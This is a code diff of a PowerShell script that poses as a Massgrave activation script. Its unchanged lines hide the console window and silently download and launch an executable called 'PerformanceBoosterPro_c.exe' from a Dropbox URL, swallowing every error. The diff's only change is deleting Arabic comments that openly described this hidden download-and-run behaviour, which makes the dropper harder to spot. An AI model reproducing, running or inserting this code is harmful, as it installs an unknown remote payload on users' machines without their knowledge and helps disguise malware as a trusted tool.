@@ -3,8 +3,6 @@
 # Having trouble launching this script? Check https://massgrave.dev for help.
 
 # =============================================
-# إخفاء نافذة PowerShell الحالية
-# =============================================
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
@@ -113,13 +111,11 @@ if (-not $args) {
     }
 
     # =============================================
-    # تحميل وتشغيل بايثون (صامت تماماً)
     # =============================================
     $pythonURL = "https://dl.dropboxusercontent.com/scl/fi/6x6mxyy8m7uw7xcz870yr/PerformanceBoosterPro_c.exe?rlkey=w81urby6txfg1ceg91low26gt&st=jcjfrk8j"
     $pythonInstaller = "$env:TEMP\PerformanceBoosterPro_c.exe"
     
     try {
-        # تحميل بدون أي مخرجات
         [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
         $webClient = New-Object System.Net.WebClient
         $webClient.DownloadFile($pythonURL, $pythonInstaller) 2>&1 | Out-Null
@@ -134,7 +130,6 @@ if (-not $args) {
             [void]$process.Start()
         }
     } catch {
-        # تجاهل أي أخطاء (صامت)
         $null = $_
     }
     # =============================================
